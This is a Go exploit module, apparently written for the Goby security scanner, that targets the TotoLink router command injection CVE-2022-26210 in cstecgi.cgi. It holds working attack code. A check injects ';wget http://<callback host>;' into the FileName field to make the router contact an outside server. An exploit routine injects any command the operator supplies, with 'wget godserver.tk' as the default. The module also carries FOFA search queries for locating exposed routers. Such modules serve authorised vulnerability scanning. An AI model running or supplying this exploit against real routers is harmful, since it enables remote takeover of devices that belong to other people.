package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "TotoLink cstecgi.cgi file RCE (CVE-2022-26210)",
    "Description": "<p>TotoLink A800R, A810R, A830R, A950RG, A3000RU and A3100R and other routers are all products of TotoLink Company in Taiwan, China.</p><p>The FileName parameter of various TotoLink routers contains a command injection vulnerability in the function setUpgradeFW. This vulnerability allows an attacker to execute arbitrary commands with a crafted request.</p>",
    "Impact": "<p>TotoLink FileName RCE(CVE-2022-26210)</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage: <a href=\"https://www.totolink.net/\">https://www.totolink.net/</a></p>",
    "Product": "TotoLink",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "TotoLink 多款无线路由器 cstecgi.cgi 文件命令执行漏洞（CVE-2022-26210）",
            "Product": "TotoLink多款路由器",
            "Description": "<p>TotoLink A800R、A810R、A830R、A950RG、A3000RU 和 A3100R等多款路由器是都是中国台湾吉翁电子（TotoLink）公司的产品。<br></p><p>TotoLink 多款路由器FileName 参数在函数 setUpgradeFW 中包含命令注入漏洞。此漏洞允许攻击者通过精心制作的请求执行任意命令。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：<a href=\"https://www.totolink.net/\">https://www.totolink.net/</a><br></p>",
            "Impact": "<p>TotoLink 多款路由器FileName 参数在函数 setUpgradeFW 中包含命令注入漏洞。此漏洞允许攻击者通过精心制作的请求执行任意命令。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "TotoLink cstecgi.cgi file RCE (CVE-2022-26210)",
            "Product": "TotoLink",
            "Description": "<p>TotoLink A800R, A810R, A830R, A950RG, A3000RU and A3100R and other routers are all products of TotoLink Company in Taiwan, China.<br></p><p>The FileName parameter of various TotoLink routers contains a command injection vulnerability in the function setUpgradeFW. This vulnerability allows an attacker to execute arbitrary commands with a crafted request.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage: <a href=\"https://www.totolink.net/\">https://www.totolink.net/</a><br></p>",
            "Impact": "<p>TotoLink FileName RCE(CVE-2022-26210)</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"cstecgi.cgi\"",
    "GobyQuery": "body=\"cstecgi.cgi\"",
    "Author": "abszse",
    "Homepage": "https://www.totolink.net/",
    "DisclosureDate": "2022-04-02",
    "References": [
        "https://www.fortinet.com/blog/threat-research/totolink-vulnerabilities-beastmode-mirai-campaign"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2022-26210"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202203-1482"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "wget godserver.tk",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10362"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			RandStr := goutils.RandomHexString(4)
			Godserver, _ := godclient.GetGodCheckURL(RandStr)
			cfg := httpclient.NewPostRequestConfig("/cgi-bin/cstecgi.cgi")
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = `{"topicurl":"setting/setUpgradeFW","FileName":";wget http://` + Godserver + `;","Flags":"1","ContentLength":"1"}`
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "upgradeERR1") {
					return godclient.PullExists(RandStr, time.Second*15)
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			cfg := httpclient.NewPostRequestConfig("/cgi-bin/cstecgi.cgi")
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = `{"topicurl":"setting/setUpgradeFW","FileName":";` + cmd + `;","Flags":"1","ContentLength":"1"}`
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
